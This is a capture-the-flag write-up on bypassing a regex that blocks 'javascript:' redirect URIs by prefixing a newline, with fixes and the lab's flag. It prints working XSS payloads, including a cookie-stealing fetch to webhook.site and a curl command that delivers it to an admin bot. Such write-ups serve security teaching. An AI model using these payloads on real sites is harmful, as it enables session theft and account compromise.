# Bad Schema Control-Character JavaScript Bypass

## What Is Happening

The [Bad Schema lab](https://ff9fd8860397.pwnbox-lab.com/) takes a redirect target from a form or from `?redirect_uri=` and claims it blocks dangerous schemas with:

```javascript
/^javascript:/i
```

It also offers a report flow that makes an admin review a supplied same-origin URL.

In practice, the filter only blocks strings that **literally start** with `javascript:`. A leading control character such as a newline bypasses the regex, but the browser still normalizes and executes the value as a `javascript:` URI when assigned to `window.location.href`.

## Why It Happens

The redirect logic does:

```javascript
if (regex.test(redirectUri)) {
    setStatus('Blocked: that schema is not allowed.', 'err');
    return false;
}

window.location.href = redirectUri;
```

The problem is the mismatch between:

```text
Validator input: raw string
Browser input:   normalized navigation target
```

So this value bypasses the regex:

```text
\njavascript:alert(1)
```

but still executes as:

```text
javascript:alert(1)
```

once the browser processes the navigation.

## Exact Test

Direct XSS proof:

```text
https://ff9fd8860397.pwnbox-lab.com/?redirect_uri=%0Ajavascript:alert(1)
```

Admin-bot exfil payload:

```text
https://ff9fd8860397.pwnbox-lab.com/?redirect_uri=%0Ajavascript:fetch('https://webhook.site/[uuid]?c='+encodeURIComponent(document.cookie))
```

Report it:

```bash
curl -sS -X POST "https://ff9fd8860397.pwnbox-lab.com/" \
  -d "url=https://ff9fd8860397.pwnbox-lab.com/?redirect_uri=%0Ajavascript%3Afetch%28%27https%3A%2F%2Fwebhook.site%2F[uuid]%3Fc%3D%27%2BencodeURIComponent%28document.cookie%29%29"
```

## Expected Signal

- `javascript:alert(1)` is blocked.
- `%0Ajavascript:alert(1)` reaches the navigation sink.
- The report form accepts the same-origin wrapper URL.
- The admin bot loads the wrapper URL and the webhook receives the cookie.

## Result Interpretation

Confirmed bug chain:

```text
naive /^javascript:/i blocklist
-> leading control character bypasses regex
-> window.location.href receives attacker string
-> browser normalizes and executes javascript: URI
-> admin bot cookie exfiltration
```

## Root Cause

The app blocklists a literal string prefix instead of parsing the URL and enforcing an explicit scheme allowlist after normalization.

## Impact

- JavaScript execution in the redirector page.
- Admin/support bot compromise through same-origin report links.
- Disclosure of non-HttpOnly cookies and in-browser secrets.
- In real systems, possible session theft or privileged actions in the victim browser context.

## Fix

- Normalize or trim the string before validation.
- Parse using `new URL()` and allow only safe schemes such as `https:`.
- Reject `javascript:`, `data:`, and other active schemes regardless of leading whitespace.
- Avoid feeding attacker-controlled redirect targets directly into `location.href`.

## Key Lesson

If a redirector blocks `javascript:` with a regex, test what happens before byte 0. A browser that trims or normalizes control characters can still execute a dangerous scheme that the raw regex missed.

## Flag

`pwnbox{8dcc91bbfddb62beae3bc8c9aca87ce0}`
